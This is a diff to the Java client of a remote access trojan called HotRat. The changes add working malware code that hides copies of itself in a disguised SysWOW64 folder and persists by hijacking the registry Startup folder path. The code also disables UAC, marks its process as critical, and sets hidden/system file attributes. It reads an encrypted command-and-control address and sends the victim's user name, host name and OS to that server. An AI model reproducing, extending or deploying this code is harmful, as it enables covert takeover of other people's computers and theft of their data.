@@ -4,50 +4,87 @@ import com.sun.jna.Memory;
 import com.sun.jna.Pointer;
 import com.sun.jna.WString;
 import com.sun.jna.platform.win32.*;
+import me.client.filecopy.Copy;
 import me.client.send.*;
 import me.client.filecopy.JarUtil;
 import me.client.utils.*;
 
 import java.io.*;
 import java.net.*;
+import java.nio.charset.StandardCharsets;
 import javax.swing.*;
 
 import static com.sun.jna.platform.win32.WinBase.MUTEX_ALL_ACCESS;
+import static com.sun.jna.platform.win32.WinDef.MAX_PATH;
 
 public class Client {
-    public static final String HEAD = "H0tRAT";
-    public static final String VERSION = "7.35";
+    public static final String VERSION = "8";
     public static boolean isturn = false;
     public static Socket socket;
     public static InetSocketAddress inetSocketAddress;
-    public static String getPath() throws IOException {
-            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Windows");
-            if(!file.exists()) {
-                file.mkdirs();
-            }
-            return file.getPath();
-        }
-    public static String getPath1() throws IOException {
-        File file = new File(System.getProperty("user.home") + "\\AppData" +"\\360Security");
+
+    public static String getWindowsPath() {
+        char[] chars = new char[MAX_PATH];
+        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
+        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsSettings");
         if(!file.exists()) {
             file.mkdirs();
         }
         return file.getPath();
     }
 
-    public static void register() throws IOException {
-        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getPath());
+    public static String getHead() {
+        String head = "";
+        String temp1 = "";
+        try {
+            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
+            String temp = "";
+            byte[] bytes = new byte[256];
+            int len = 0;
+            while ((len = fileInputStream.read(bytes))!=-1) {
+                temp += new String(bytes,0,len);
+            }
+            fileInputStream.close();
+            temp1 = new String(AESUtils.decrypt(temp));
+            head = temp1.substring(temp1.indexOf("Head:") + 5,temp1.indexOf("password:") - 1);
+        }catch (Exception e) {
+            e.printStackTrace();
+        }
+        return head;
+    }
+
+    public static String getWindowsPath1() {
+        char[] chars = new char[MAX_PATH];
+        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
+        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsConfig");
+        if(!file.exists()) {
+            file.mkdirs();
+        }
+        return file.getPath();
+    }
+
+    public static void register(){
+        File file = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\360Security.ini");
+        JarUtil jarUtil = new JarUtil(Client.class);
+        String path = jarUtil.getJarPath() + "\\javaw.jar";
+        Copy copy = new Copy(path,Client.getWindowsPath() + "\\Java(TM) Platform EE binary.jar");
+        Copy copy1 = new Copy(jarUtil.getJarPath() + "\\360Security.ini",getWindowsPath1() + "\\WindowsConfig.ini");
+        copy.copy();
+        copy1.copy();
+        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getWindowsPath());
         WinDef.DWORD dword = new WinDef.DWORD(WinNT.FILE_ATTRIBUTE_HIDDEN | WinNT.FILE_ATTRIBUTE_SYSTEM | 0x00000001);
-        Kernel32.INSTANCE.SetFileAttributes(getPath(),dword);
-        Kernel32.INSTANCE.SetFileAttributes(getPath1(),dword);
+        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath(),dword);
+        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath1(),dword);
+        Kernel32.INSTANCE.SetFileAttributes(path,dword);
+        file.delete();
         Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000000);//关闭UAC提示
     }
 
-    public static String GetIP() {
+    public static String getIP() {
         String IP = "";
         String temp1 = "";
         try {
-            FileInputStream fileInputStream = new FileInputStream(getPath1() + "\\360Security.ini");
+            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
             String temp = "";
             byte[] bytes = new byte[256];
             int len = 0;
@@ -63,11 +100,11 @@ public class Client {
         return IP;
     }
 
-    public static int GetPort() {
+    public static int getPort() {
         String Port = "";
         int port = 0;
         try {
-            FileInputStream fileInputStream = new FileInputStream(getPath1() + "\\360Security.ini");
+            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
             String temp = "";
             String temp1 = "";
             byte[] bytes = new byte[256];
@@ -77,24 +114,24 @@ public class Client {
             }
             fileInputStream.close();
             temp1 = new String(AESUtils.decrypt(temp));
-            Port = temp1.substring(temp1.indexOf("Port:") + 5);
+            Port = temp1.substring(temp1.indexOf("Port:") + 5,temp1.indexOf("Head:")-1);
             port = Integer.parseInt(Port);
         }catch (Exception e) {
         }
         return port;
     }
-    public static void relieve() throws IOException {
+    public static void relieve(){
         //解除主机
-        LoadDLL.instance.RemoveProtect();
+        File file = new File(getWindowsPath1() + "\\WindowsConfig.ini");
+        LoadDLL.instance.RemoveProcessIsCritical();
         Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
         Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
-        File file = new File(getPath1() + "\\360Security.ini");
         file.delete();
         System.exit(0);
     }
     public static void lock() {
-        if(Kernel32.INSTANCE.OpenMutex(MUTEX_ALL_ACCESS,false,"HotRat") == null) {
-            Kernel32.INSTANCE.CreateMutex(null,false,"HotRat");
+        if(Kernel32.INSTANCE.OpenMutex(MUTEX_ALL_ACCESS,false,"TheHotRat") == null) {
+            Kernel32.INSTANCE.CreateMutex(null,false,"TheHotRat");
         }else {
             Kernel32.INSTANCE.ExitProcess(0);
         }
@@ -104,9 +141,9 @@ public class Client {
         lock();
         register();
         LoadDLL.instance.EnableDebugPriv();
-        LoadDLL.instance.ProtectProcess();
-        new Thread(new ShutdownChecker()).start();
-        inetSocketAddress = new InetSocketAddress(GetIP(),GetPort());
+        LoadDLL.instance.SetProcessIsCritical();
+        new ShutdownChecker().start();
+        inetSocketAddress = new InetSocketAddress(getIP(),getPort());
         try {
             while (!isturn) {
                 con();
@@ -122,7 +159,7 @@ public class Client {
             JarUtil jarUtil = new JarUtil(Client.class);
             String IP = GetInternetIP.getIP();
             DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
-            dataOutputStream.writeUTF(HEAD);
+            dataOutputStream.writeUTF(getHead());
             dataOutputStream.writeUTF(System.getProperty("user.name"));
             dataOutputStream.writeUTF(InetAddress.getLocalHost().getHostName());
             dataOutputStream.writeUTF(System.getProperty("os.name"));
